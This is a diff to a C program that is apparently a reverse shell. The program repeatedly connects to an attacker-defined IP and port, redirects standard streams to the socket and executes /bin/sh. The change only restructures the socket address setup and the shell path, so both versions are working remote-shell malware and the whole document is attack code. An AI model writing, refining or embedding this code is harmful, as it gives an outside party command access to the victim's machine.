@@ -1,4 +1,5 @@
 #include <stdio.h>
+#include <string.h>
 #include <sys/socket.h>
 #include <sys/types.h>
 #include <stdlib.h>
@@ -17,11 +18,11 @@
 #endif
 
 int main(void) {
-    struct sockaddr_in revsockaddr = {
-        .sin_family = AF_INET,
-        .sin_port   = htons(ATTACKER_PORT),
-        .sin_addr.s_addr = inet_addr(ATTACKER_IP),
-    };
+    struct sockaddr_in revsockaddr;
+    memset(&revsockaddr, 0, sizeof(revsockaddr));
+    revsockaddr.sin_family      = AF_INET;
+    revsockaddr.sin_port        = htons(ATTACKER_PORT);
+    revsockaddr.sin_addr.s_addr = inet_addr(ATTACKER_IP);
 
     while (1) {
         int sockt = socket(AF_INET, SOCK_STREAM, 0);
@@ -38,8 +39,9 @@ int main(void) {
         dup2(sockt, 2);
         close(sockt);
 
-        char *argv[] = { "/bin/sh", NULL };
-        execve("/bin/sh", argv, NULL);
+        char shell[] = "/bin/sh";
+        char *argv[] = { shell, NULL };
+        execve(shell, argv, NULL);
 
         sleep(RETRY_DELAY);
     }
